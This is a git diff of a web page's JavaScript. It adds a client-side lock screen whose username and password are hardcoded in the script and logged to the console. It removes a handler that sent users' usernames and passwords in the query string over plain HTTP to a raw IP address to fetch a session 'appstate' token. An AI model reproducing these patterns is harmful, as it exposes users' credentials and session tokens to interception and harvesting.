@@ -5,19 +5,19 @@ document.addEventListener("DOMContentLoaded", () => {
             title: "Login Required",
             html: `
                 <div class="mb-3">
-                    <label for="username" class="form-label">Username</label>
-                    <input type="text" id="username" class="form-control" placeholder="Enter Username">
+                    <label for="usernameField" class="form-label">Username</label>
+                    <input type="text" id="usernameField" class="form-control" placeholder="Enter Username">
                 </div>
                 <div class="mb-3">
-                    <label for="password" class="form-label">Password</label>
-                    <input type="password" id="password" class="form-control" placeholder="Enter Password">
+                    <label for="passwordField" class="form-label">Password</label>
+                    <input type="password" id="passwordField" class="form-control" placeholder="Enter Password">
                 </div>
             `,
             confirmButtonText: "Login",
             showCancelButton: false,
             preConfirm: () => {
-                const username = document.getElementById("username").value.trim();
-                const password = document.getElementById("password").value.trim();
+                const username = document.getElementById("usernameField").value.trim();
+                const password = document.getElementById("passwordField").value.trim();
                 console.log("Username:", username); // Debugging username
                 console.log("Password:", password); // Debugging password
                 if (username === "Pyeul" && password === "Mariz2006") {
@@ -31,6 +31,18 @@ document.addEventListener("DOMContentLoaded", () => {
     };
 
     lockScreen();
+
+    // Toggle password visibility
+    const showPasswordCheckbox = document.getElementById('showPassword');
+    const passwordField = document.getElementById('passwordField');
+
+    showPasswordCheckbox.addEventListener('change', () => {
+        if (showPasswordCheckbox.checked) {
+            passwordField.type = 'text';
+        } else {
+            passwordField.type = 'password';
+        }
+    });
 
     // Share form submission
     document.getElementById("shareForm").addEventListener("submit", function (e) {
@@ -193,45 +205,4 @@ document.addEventListener("DOMContentLoaded", () => {
 
     // Initial call to link processing
     linkOfProcessing();
-
-    // Handling login form submission
-    document.getElementById('login-form')?.addEventListener('submit', async function (event) {
-        event.preventDefault();
-        const button = document.getElementById('login-button');
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-
-        try {
-            button.innerText = 'Logging In';
-            const response = await fetch(`http://65.109.58.118:26011/api/appstate?e=${username}&p=${password}`, {
-                method: 'GET'
-            });
-            const data = await response.json();
-
-            if (data.success) {
-                document.getElementById('result-container').style.display = 'block';
-                const appstate = data.success;
-                document.getElementById('appstate').innerText = appstate;
-                alert('Login Success, Click "Ok"');
-                button.innerText = 'Logged In';
-                document.getElementById('copy-button').style.display = 'block';
-            } else {
-                alert('Failed to retrieve appstate. Please check your credentials and try again.');
-            }
-        } catch (error) {
-            console.error('Error retrieving appstate:', error);
-            alert('An error occurred while retrieving appstate. Please try again later.');
-        }
-    });
-
-    // Copy appstate to clipboard
-    document.getElementById('copy-button').addEventListener('click', function () {
-        const appstateText = document.getElementById('appstate').innerText;
-        navigator.clipboard.writeText(appstateText).then(function () {
-            alert('Appstate copied to clipboard!');
-        }, function (err) {
-            console.error('Failed to copy appstate: ', err);
-            alert('Failed to copy appstate. Please try again.');
-        });
-    });
 });
